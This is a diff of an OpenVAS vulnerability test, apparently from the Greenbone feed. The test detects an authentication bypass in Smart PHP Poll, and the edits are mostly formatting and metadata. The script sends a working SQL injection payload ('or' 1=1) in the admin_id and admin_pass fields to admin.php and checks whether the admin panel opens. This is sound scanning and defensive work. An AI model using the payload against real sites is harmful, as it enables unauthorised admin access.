@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_smart_php_poll_auth_bypass_vuln.nasl 5818 2017-03-31 10:29:04Z cfi $
+# $Id: gb_smart_php_poll_auth_bypass_vuln.nasl 11240 2018-09-05 10:15:12Z mmartin $
 #
 # Smart PHP Poll Authentication Bypass Vulnerability
 #
@@ -27,39 +27,37 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805506");
-  script_version("$Revision: 5818 $");
+  script_version("$Revision: 11240 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2017-03-31 12:29:04 +0200 (Fri, 31 Mar 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-05 12:15:12 +0200 (Wed, 05 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-03-17 15:24:03 +0530 (Tue, 17 Mar 2015)");
   script_name("Smart PHP Poll Authentication Bypass Vulnerability");
 
-  script_tag(name: "summary" , value: "This host is installed with Smart PHP Poll
+  script_tag(name:"summary", value:"This host is installed with Smart PHP Poll
   and is prone to authentication bypass vulnerability.");
 
-  script_tag(name: "vuldetect" , value: "Send a crafted request via HTTP GET and
+  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
   check whether it is able to bypass authentication oe not.");
 
-  script_tag(name: "insight" , value: "The flaw exists due to inadequate
+  script_tag(name:"insight", value:"The flaw exists due to inadequate
   validation of input passed via POST parameters 'admin_id' and 'admin_pass'
   to admin.php script");
 
-  script_tag(name: "impact" , value: "Successful exploitation will allow
+  script_tag(name:"impact", value:"Successful exploitation will allow
   remote attackers to bypass the authentication.
 
   Impact Level: Application.");
 
-  script_tag(name: "affected" , value:"Smart PHP Poll");
+  script_tag(name:"affected", value:"Smart PHP Poll");
 
-  script_tag(name: "solution" , value:"No solution or patch was made available
-  for at least one year since disclosure of this vulnerability. Likely none will
-  be provided anymore. General solution options are to upgrade to a newer release,
-  disable respective features, remove the product or replace the product by another
-  one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
+Likely none will be provided anymore.
+General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
   script_tag(name:"qod_type", value:"exploit");
-  script_xref(name: "URL" , value : "http://www.exploit-db.com/exploits/36386");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36386");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
   script_family("Web application abuses");
@@ -72,12 +70,6 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-
-## Variable Initialization
-http_port = "";
-dir = "";
-sndReq = "";
-rcvRes = "";
 
 http_port = get_http_port(default:80);
 if(!can_host_php(port:http_port)){
@@ -93,7 +85,6 @@ foreach dir (make_list_unique("/", "/smart_php_poll", "/poll", cgi_dirs( port:ht
   url = dir + "/admin.php";
   rcvRes = http_get_cache(item:url, port:http_port);
 
-  ##Confirm Application
   if (rcvRes && rcvRes =~ ">Smart PHP Poll.*Administration Panel<")
   {
     postData = "admin_id=admin+%27or%27+1%3D1&admin_pass=admin+%27or%27+1%3D1";
@@ -106,7 +97,6 @@ foreach dir (make_list_unique("/", "/smart_php_poll", "/poll", cgi_dirs( port:ht
                     postData);
     rcvRes = http_send_recv(port:http_port, data:sndReq);
 
-    ##Confirm Exploit 
     if(rcvRes && ">Main Menu<" >< rcvRes && ">Logout<" >< rcvRes
               && ">Smart PHP Poll" >< rcvRes)
     {
